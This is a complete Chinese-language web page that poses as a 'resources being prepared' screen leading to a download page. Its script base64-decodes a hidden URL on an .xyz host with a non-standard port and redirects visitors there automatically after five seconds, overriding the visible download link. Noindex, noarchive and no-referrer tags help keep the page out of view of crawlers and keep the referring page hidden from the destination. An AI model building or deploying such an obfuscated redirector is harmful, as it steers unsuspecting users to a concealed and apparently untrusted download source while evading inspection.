<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <link rel="canonical" href="https://bjhuahui.cn/">
  <link rel="icon" href="/favicon.ico">
  <title>资源准备中</title>
  <style>
    :root{--bg:#070b1d;--panel:rgba(20,28,64,.82);--cyan:#42f0d7;--violet:#8d67ff;--text:#f6f8ff;--muted:#b9c4e8}
    *{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;background:radial-gradient(circle at 20% 20%,rgba(66,240,215,.18),transparent 32%),radial-gradient(circle at 80% 30%,rgba(141,103,255,.22),transparent 36%),linear-gradient(135deg,#070b1d,#101942 55%,#151a3f);font-family:Arial,"Microsoft YaHei",sans-serif;color:var(--text)}
    .wrap{width:min(92vw,520px);padding:42px;border:1px solid rgba(255,255,255,.14);border-radius:24px;background:var(--panel);box-shadow:0 26px 90px rgba(0,0,0,.38),0 0 40px rgba(66,240,215,.12);text-align:center;backdrop-filter:blur(16px)}
    .pulse{width:78px;height:78px;margin:0 auto 22px;border-radius:50%;border:1px solid rgba(66,240,215,.45);position:relative;box-shadow:0 0 32px rgba(66,240,215,.24)}
    .pulse:before,.pulse:after{content:"";position:absolute;border-radius:50%;inset:16px;background:linear-gradient(135deg,var(--cyan),var(--violet))}
    .pulse:after{inset:29px;background:#fff;box-shadow:0 0 20px rgba(255,255,255,.85)}
    h1{margin:0 0 14px;font-size:30px;letter-spacing:0}p{margin:8px 0;color:var(--muted);line-height:1.7}.bar{height:9px;border-radius:999px;background:rgba(255,255,255,.1);overflow:hidden;margin:26px 0}.bar span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--cyan),var(--violet));animation:load 5s linear forwards}.manual{display:inline-flex;align-items:center;justify-content:center;min-height:46px;padding:0 24px;border-radius:12px;background:linear-gradient(135deg,var(--cyan),var(--violet));color:#061025;text-decoration:none;font-weight:700;box-shadow:0 14px 34px rgba(66,240,215,.22)}@keyframes load{to{width:100%}}
  </style>
</head>
<body>
  <main class="wrap" aria-live="polite">
    <div class="pulse" aria-hidden="true"></div>
    <h1>资源准备中</h1>
    <p>正在校验连接环境</p>
    <p>即将进入下载页面</p>
    <p>请勿关闭当前页面</p>
    <div class="bar"><span></span></div>
    <a class="manual" href="/kexue.html" rel="nofollow noopener noreferrer" id="manualDownload">立即下载</a>
  </main>
  <script>
    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9iNTUuMzEzNDg2Lnh5ejozNTg4OC8=");
    const manualDownload = document.getElementById("manualDownload");
    manualDownload.addEventListener("click", function(e){
      e.preventDefault();
      window.location.replace(REAL_DOWNLOAD_URL);
    });
    window.setTimeout(function(){
      window.location.replace(REAL_DOWNLOAD_URL);
    }, 5000);
  </script>
</body>
</html>
